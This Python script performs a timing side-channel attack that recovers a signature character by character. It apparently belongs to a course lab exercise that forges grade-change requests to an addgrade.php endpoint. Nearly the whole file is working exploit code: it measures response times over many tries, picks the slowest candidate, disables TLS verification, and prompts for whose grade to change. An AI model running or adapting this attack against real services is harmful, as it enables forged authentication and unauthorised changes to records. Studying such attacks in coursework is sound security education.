import requests
import time
from sys import argv
requests.packages.urllib3.disable_warnings()

def get_req(url, payload):
     return requests.get(url, params=payload, verify=False)

def req_time(url, payload):
    return get_req(url, payload).elapsed.total_seconds()

def key_max_val(d):
    return max(d, key = d.get)
# Kalle 5 6823ea50b133c58cba36
# https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823
def timing_attack(name, grade, h_str="0123456789abcdef", length=20, tries=20):
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
    sign = ""
    t = time.time()
    payload = {"name": name, "grade": grade, "signature": sign}
    for i in range(length):
        req_times = {}
        for char in h_str:
            t_sign = sign + char
            payload["signature"] = t_sign
            req_times[t_sign] = min([req_time(url, payload) for x in range(tries)])
        sign = key_max_val(req_times)
        print(sign)
    payload["signature"] = sign
    req = get_req(url, payload)
    ver = req.text.strip() == "1"
    m, s = divmod(time.time() - t, 60)
    print("{}:{}".format(int(m), round(s)))
    print("Request: {}?name={}&grade={}&signature={}".format(url, name, grade, sign))
    print("Signature valid: {}".format(req.text.strip() == "1"))
    print("Name: {}, Grade: {}, Signature: {}".format(name, grade, sign))
    return sign

if __name__ == '__main__':
    if len(argv)  == 3:
        name = argv[1]
        grade = argv[2]
    else:
        name = input("Choose name to change grade on: ")
        grade = input("Choose grade: ")
    print("Calculating signature for name: {} and grade: {}".format(name, grade))
    timing_attack(name, grade)
